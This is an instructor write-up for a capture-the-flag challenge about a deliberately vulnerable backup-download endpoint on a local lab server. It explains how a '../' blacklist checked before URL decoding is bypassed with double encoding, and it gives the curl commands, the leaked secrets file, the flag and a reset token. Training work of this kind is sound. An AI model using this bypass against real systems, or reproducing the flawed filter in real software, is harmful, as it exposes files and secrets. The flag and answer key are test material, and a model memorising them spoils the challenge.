# Challenge 10 — The Config Backup: Instructor Write-Up
**Target System:** Veyra Cloud Backup Gateway
**Category:** File Handling / Path Traversal
**Flag:** `ROOT{c0nf1g_b4ckup_tr4v3rs4l_98a2}`
**Points:** 15 (Progressive Tier)
**Port:** 3010

---

## 1. Underlying Concept & Intentional Teaching Gap

The application exposes a backup download utility (`/api/download?file=...`) intended to serve synthetic backup dumps and system configurations from `data/backups`.

### The Intentional Weakness:
The backend attempts to defend against directory traversal by applying a naive literal blacklist filter:
```typescript
if (rawFileParam.includes('../')) {
  return res.status(404).json(GENERIC_NOT_FOUND_RESPONSE);
}
```
Crucially, the server performs URL decoding **after** evaluating the blacklist check:
```typescript
const decodedFilename = decodeURIComponent(rawFileParam);
const targetFilePath = path.resolve(BACKUP_DIR, decodedFilename);
```

Because modern web frameworks like Express decode incoming query parameters once by default, an attacker submitting URL double-encoding (`%252e%252e%252f`) achieves the following sequence:
1. Express decodes `%25` to `%`, producing `%2e%2e%2f` in `req.query.file`.
2. The literal check `rawFileParam.includes('../')` evaluates to `false` because the characters `..` and `/` are still URL-encoded as `%2e%2e%2f`.
3. The server then calls `decodeURIComponent('%2e%2e%2f')`, transforming it into `../`.
4. `path.resolve` navigates outside the intended `backups` directory into adjacent directories.

### Uniform Error Response:
To teach indirect discovery without informational side-channels, both a filtered request and a nonexistent file return the exact same HTTP 404 response:
```json
{
  "error": "NotFound",
  "message": "The requested backup artifact does not exist or access is restricted."
}
```

---

## 2. Step-by-Step Solution Path

### Step A: Reconnaissance & Clue Discovery
1. Browse available public backup files:
   ```bash
   curl http://localhost:3010/api/files
   ```
2. Download and inspect the public configuration file:
   ```bash
   curl http://localhost:3010/api/download?file=system-config.json
   ```
3. Inside `system-config.json`, observe the clue:
   ```json
   "vault_recovery_archive": "Emergency master encryption secret archived at ../secrets/recovery.vault"
   ```

### Step B: Testing Filter & Traversing via Double-Encoding
1. Attempting a naive traversal:
   ```bash
   curl "http://localhost:3010/api/download?file=../secrets/recovery.vault"
   ```
   **Output:** HTTP 404 (Blocked by literal check).

2. Bypassing the filter using URL double-encoding (`%252e%252e%252f`):
   ```bash
   curl "http://localhost:3010/api/download?file=%252e%252e%252fsecrets/recovery.vault"
   ```
   **Output (HTTP 200 OK):**
   ```ini
   # ==============================================================================
   # Veyra Cloud Solutions — Production Master Recovery Vault
   # RESTRICTED: Authorised Infrastructure Security Operations Only
   # ==============================================================================
   VAULT_KEY_ID=VK-2026-98A2
   VAULT_MASTER_SECRET=ROOT{c0nf1g_b4ckup_tr4v3rs4l_98a2}
   RECOVERY_PASSPHRASE=veyra-infra-emergency-recovery-2026
   ARCHIVE_HASH=d41d8cd98f00b204e9800998ecf8427e
   STATUS=ACTIVE
   ```

3. Submit the recovered flag:
   `ROOT{c0nf1g_b4ckup_tr4v3rs4l_98a2}`.

---

## 3. Reset Procedure

If the service needs verification or resetting during live operations:
```bash
curl -X POST http://localhost:3010/reset/10 \
  -H "Authorization: Bearer dev-reset-bearer-token-12345"
```

**Expected Response (HTTP 200 OK):**
```json
{
  "status": "ok",
  "challenge_id": 10,
  "reset_at": "2026-11-09T06:00:00.000Z",
  "message": "Config backup sandbox verified clean"
}
```
Or trigger it remotely from the Admin Console via the force-reset proxy.
